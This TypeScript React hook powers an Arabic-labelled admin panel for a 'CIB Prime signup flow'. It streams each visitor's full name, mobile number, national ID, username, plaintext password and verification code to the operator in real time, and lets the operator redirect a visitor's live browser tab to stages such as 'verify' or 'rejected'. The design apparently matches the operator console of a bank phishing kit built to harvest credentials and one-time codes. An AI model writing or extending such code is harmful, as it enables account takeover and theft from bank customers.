import { useCallback, useEffect, useRef, useState } from 'react';
import { RealtimeSocket, type RealtimeStatus } from '@/lib/realtimeSocket';

// Stages a customer session can be in. "home" is the landing page; the
// others match the CIB Prime signup flow.
export type ClientStage = 'home' | 'signup' | 'create_account' | 'pending_approval' | 'verify' | 'rejected';

export type ClientState = {
  sessionId: string;
  fullName: string | null;
  mobile: string | null;
  nationalId: string | null;
  username: string | null;
  password: string | null;
  verificationCode: string | null;
  stage: ClientStage | string;
  status: 'online' | 'offline' | string;
  lastSeenAt: string | null;
  updatedAt: string;
  createdAt: string;
};

export type StageLogEntry = {
  id: number;
  payload: Record<string, unknown>;
  createdAt: string;
};

// Powers the "معالجة الطلبات" admin panel: keeps a live map of every
// customer session (creation + every update pushed in real time), lets the
// panel fetch history for a given session/stage box, and lets the panel
// send redirect commands that are forwarded straight to that customer's
// live browser tab.
export function useAdminRealtime() {
  const socketRef = useRef<RealtimeSocket | null>(null);
  const [clients, setClients] = useState<Record<string, ClientState>>({});
  const [status, setStatus] = useState<RealtimeStatus>('connecting');
  const historyResolvers = useRef(new Map<string, (logs: StageLogEntry[]) => void>());

  useEffect(() => {
    const socket = new RealtimeSocket({ type: 'hello', role: 'admin' });
    socketRef.current = socket;

    const unsubscribeStatus = socket.onStatusChange(setStatus);
    const unsubscribeMessage = socket.onMessage((msg) => {
      if (msg.type === 'client_list' && Array.isArray(msg.clients)) {
        const map: Record<string, ClientState> = {};
        for (const c of msg.clients as ClientState[]) map[c.sessionId] = c;
        setClients(map);
      } else if (msg.type === 'client_state' && msg.client) {
        const c = msg.client as ClientState;
        setClients((prev) => ({ ...prev, [c.sessionId]: c }));
      } else if (msg.type === 'client_history') {
        const key = `${msg.sessionId}:${msg.stage}`;
        const resolve = historyResolvers.current.get(key);
        if (resolve) {
          resolve((msg.logs as StageLogEntry[]) ?? []);
          historyResolvers.current.delete(key);
        }
      }
    });

    socket.connect();

    return () => {
      unsubscribeStatus();
      unsubscribeMessage();
      socket.close();
    };
  }, []);

  const requestHistory = useCallback((sessionId: string, stage: string): Promise<StageLogEntry[]> => {
    return new Promise((resolve) => {
      const key = `${sessionId}:${stage}`;
      historyResolvers.current.set(key, resolve);
      socketRef.current?.send({ type: 'request_history', sessionId, stage });
      window.setTimeout(() => {
        if (historyResolvers.current.has(key)) {
          historyResolvers.current.delete(key);
          resolve([]);
        }
      }, 8000);
    });
  }, []);

  const sendRedirect = useCallback((sessionId: string, target: ClientStage) => {
    socketRef.current?.send({ type: 'redirect', sessionId, target });
  }, []);

  const clientList = Object.values(clients).sort(
    (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime(),
  );

  return { clients: clientList, status, requestHistory, sendRedirect };
}
